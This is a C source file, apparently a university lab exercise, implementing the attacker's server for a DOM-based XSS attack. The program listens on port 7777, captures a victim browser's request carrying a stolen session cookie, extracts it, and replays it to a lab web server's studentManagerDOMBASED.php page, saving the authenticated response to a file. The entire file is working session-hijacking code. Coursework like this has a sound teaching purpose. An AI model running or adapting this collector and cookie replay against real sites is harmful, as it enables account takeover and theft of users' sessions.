/*
 * ex3_dom.c
 * 
 * DOM-based XSS Attack Demonstration - Attacker's Server
 * a HTTP server that listens on port 7777
 * and captures one HTTP GET request containing stolen session cookies from
 * a DOM-based XSS attack.
 * Compilation: gcc -Wall -Wextra -Werror -Wconversion ex3_dom.c -o ex3_dom
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// web server config
#define WEB_IP "192.168.1.203"
#define WEB_PORT 80
// port that the attacker server listens on
#define PORT 7777
// consts
#define BUFFER_SIZE 8192
#define OUTPUT_FILE "spoofed-dom.txt"
// return value for failure
#define FAILURE 0
// return value for success
#define SUCCESS 1

/*
 * setup_server_socket - opens socket and configures it to allow reusing
 * addresses
 * and ports. ( SO_REUSEADDR and SO_REUSEPORT)
 * Returns fd of the opened socket. else, if couldn't open and set its options
 * as described above - the program will exit with exit code 1 = EXIT_FAILURE.
 */
static int setup_server_socket(void)
{
  // open socket
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  // check if opened successfully
  if (fd < 0) {
    exit(EXIT_FAILURE);
  }
  // setting options - taken from ex0.pdf
  int opt = 1;
  // allows reusing a local addr (IP+PORT) even if it's still marked "in
  // use" after closing (in case restarting server quickly)
  if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR,
                 &opt, (socklen_t)sizeof(opt)) < 0) {
    close(fd);
    exit(EXIT_FAILURE);
  }
  // reusing port - allows multiple sockets (or processes)
  // to bind to the same port number.
  if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT,
                 &opt, (socklen_t)sizeof(opt)) < 0) {
    close(fd);
    exit(EXIT_FAILURE);
  }
  // return the opened sockect fd.
  return fd;
}
/*
 * extract_cookie
 *
 * Extracts the raw cookie value from an HTTP request string.
 *
 * The function searches for the substring "cookie=" and copies
 * only the cookie value itself (no header name, no spaces).
 *
 * Parameters:
 *   request    - Raw HTTP request received from the victim browser
 *   cookie_out - Output buffer to store extracted cookie value
 *   out_size   - Size of the output buffer
 *
 * Returns:
 *   SUCCESS (1) if cookie is found and copied
 *   FAILURE (0) if cookie is missing or buffer overflow would occur
 */
static int extract_cookie(const char *request,
                          char *cookie_out,
                          size_t out_size)
{
  // locate "cookie=" substring
  const char *cookie_start = strstr(request, "cookie=");
  if (cookie_start == NULL) {
    return FAILURE;
  }
  // skip the literal "cookie=" part
  cookie_start += strlen("cookie=");

  const char *end = cookie_start;
  while (*end != ' ' &&
         *end != '\r' &&
         *end != '\n')
  {
    end++;
  }
  // calc cookie len
  size_t len = (size_t)(end - cookie_start);
  if (len == 0 || len >= out_size)
    return FAILURE;
  // copy cookie value and null terminate
  memcpy(cookie_out, cookie_start, len);
  cookie_out[len] = '\0';

  return SUCCESS;
}

/*
 * bind_and_listen
 *
 * Binds the server socket to INADDR_ANY on PORT and starts listening.
 *
 * Parameters:
 *   server_fd   - File descriptor of the server socket
 *   server_addr - sockaddr_in structure to initialize
 *
 * Returns:
 *   SUCCESS (1) on success
 *   FAILURE (0) on bind or listen failure
 */
static int bind_and_listen(int server_fd, struct sockaddr_in *server_addr)
{
  // config server address
  server_addr->sin_family = AF_INET;
  server_addr->sin_addr.s_addr = INADDR_ANY;
  server_addr->sin_port = htons(PORT);
  // bind socket to address
  if (bind(server_fd, (struct sockaddr *)server_addr, sizeof(*server_addr))
      < 0) {
    return FAILURE;
  }
  // listen for a single incoming connection
  if (listen(server_fd, 1) < 0) {
    return FAILURE;
  }

  return SUCCESS;
}


/*
 * recv_response_from_web
 *
 * Receives the full HTTP response from the target web server
 * and writes it to OUTPUT_FILE.
 *
 * Parameters:
 *   web_fd - Connected socket to the web server
 *
 * Returns:
 *   SUCCESS (1) if at least one byte was received
 *   FAILURE (0) on error or empty response
 */
static int recv_response_from_web(int web_fd){
  // open output file for writing
  FILE * output_file = fopen(OUTPUT_FILE, "w");
  if (!output_file) {
    return FAILURE;
  }
  // init buffer and clear (in case of garbage values)
  char response_from_web[BUFFER_SIZE];
  memset(response_from_web,0,BUFFER_SIZE);
  // flg that indicates at least one byte of response was captured
  int recv_flg=0;
  // init len of received bytes
  ssize_t recv_len;
  // keep reading response until there are no bytes left (to read).
  while((recv_len = read(web_fd, response_from_web, BUFFER_SIZE - 1))>0){
    // write to the output file the bytes just captured
    fwrite(response_from_web,1,(size_t)recv_len,output_file);
    // 'clean' the buffer - making space for the unread bytes
    memset(response_from_web,0,BUFFER_SIZE);
    // recv_len > 0 at least once
    recv_flg=1;
  }
  // close the OUTPUT_FILE - cuz we wrote the response
  fclose(output_file);

  return recv_flg;
}
/*
 * send_http_response - Sends a minimal HTTP 200 OK response
 * @client_fd: File descriptor of the connected client socket
 */
static void send_http_response(int client_fd) {
  const char *response =
      "HTTP/1.1 200 OK\r\n"
      "Content-Type: text/html\r\n"
      "Content-Length: 27\r\n"
      "Connection: close\r\n"
      "\r\n"
      "<html>Request logged</html>";

  ssize_t sent = write(client_fd, response, strlen(response));
  (void)sent;
}

/*
 * send_request_to_web
 *
 * Sends an authenticated HTTP request to the vulnerable web server
 * using the stolen cookie.
 *
 * Parameters:
 *   cookie_id - Extracted session cookie value
 *
 * Returns:
 *   SUCCESS (1) on success
 *   FAILURE (0) on socket, send, or receive error
 */
static int send_request_to_web(const char *cookie_id)
{
  // create socket
  int web_fd = socket (AF_INET, SOCK_STREAM, 0);
  // check if opened successfully
  if (web_fd < 0) {
    return FAILURE;
  }

  struct sockaddr_in web_addr;
  web_addr.sin_family = AF_INET;
  web_addr.sin_port = htons (WEB_PORT);
  // convert IP string to binary form
  if (inet_pton (AF_INET, WEB_IP, &web_addr.sin_addr) <= 0){
    close (web_fd);
    return FAILURE;
  }
  // connect to web server
  if (connect (web_fd, (struct sockaddr *) &web_addr, sizeof (web_addr)) < 0){
    close(web_fd);
    return FAILURE;
  }
  // init request buffer
  char request[BUFFER_SIZE];
  // Build HTTP GET request with stolen cookie
  int len = snprintf (request, sizeof (request),
                      "GET /studentManagerDOMBASED.php HTTP/1.1\r\n"
                      "Host: %s\r\n"
                      "Cookie: %s\r\n"
                      "Connection: close\r\n"
                      "\r\n",
                      WEB_IP, cookie_id);
  // check if len valid
  if (len <= 0 || len >= BUFFER_SIZE){
    close(web_fd);
    return FAILURE;
  }
  // send req
  if (send (web_fd, request, strlen(request), 0) < 0){
    close(web_fd);
    return FAILURE;
  }
  // receive and store server response
  if (recv_response_from_web (web_fd) != 1){
    close (web_fd);
    return FAILURE;
  }
  close(web_fd);
  return SUCCESS;
}

/*
 * accept_addr
 *
 * Accepts a single incoming client connection.
 *
 * Parameters:
 *   server_fd - Listening server socket
 *   addr      - sockaddr_in structure to receive client address
 *
 * Returns:
 *   Client socket file descriptor on success
 *   Negative value on failure
 */
static int accept_addr(int server_fd, struct sockaddr_in *addr){
  // length of address struct
  socklen_t  addr_len = sizeof(addr);
  // accept() blocks until connection occurs
  int accept_fd = accept(server_fd, (struct sockaddr *)addr,
                         &addr_len);
  return accept_fd;
}

/*
 * main
 *
 * Program entry point.
 *
 * Flow:
 * 1. Create server socket
 * 2. Bind and listen
 * 3. Accept victim connection
 * 4. Read HTTP request
 * 5. Extract stolen cookie
 * 6. Forward cookie to target server
 * 7. Save response and exit
 */
int main(void) {

    // SET UP SERVER SOCKET
    int server_fd = -1;
    server_fd = setup_server_socket();
    if (server_fd < 0)
    {
      close(server_fd);
      exit(EXIT_FAILURE);
    }
    // BIND AND LISTEN
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    int bind_n_listen = bind_and_listen(server_fd, &addr);
    if (bind_n_listen!=1){
      close(server_fd);
      exit(EXIT_FAILURE);
    }

    // ACCEPT VICTIM CONNECTION
    int accept_fd = -1;
    accept_fd = accept_addr(server_fd, &addr);
    if (accept_fd < 0){
      close(server_fd);
      exit(EXIT_FAILURE);
    }

    // HANDLE STOLEN COOKIE - to browse the target URL
    char buffer[BUFFER_SIZE];
    // READ
    ssize_t bytes_read;
    memset(buffer, 0, BUFFER_SIZE);
    bytes_read = read(accept_fd, buffer, BUFFER_SIZE - 1);
    if (bytes_read < 0) {
      close(accept_fd);
      close(server_fd);
      exit(EXIT_FAILURE);
    }
    buffer[bytes_read] = '\0';
    // SEND RESPONSE TO VICTIM
    send_http_response(accept_fd);

  // EXTRACT COOKIE FROM STOLEN COOKIE
  char cookie[BUFFER_SIZE];
  memset(cookie, 0, sizeof(cookie));
  if (!extract_cookie(buffer, cookie, sizeof(cookie))) {
    close(accept_fd);
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  // SEND REQUEST TO WEB AND SAVE RESPONSE TO OUT FILE
  if (send_request_to_web(cookie)!=1){

    close(accept_fd);
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  // TERMINATE
  close(accept_fd);
  close(server_fd);
  exit (EXIT_SUCCESS);

  exit(EXIT_SUCCESS);
}
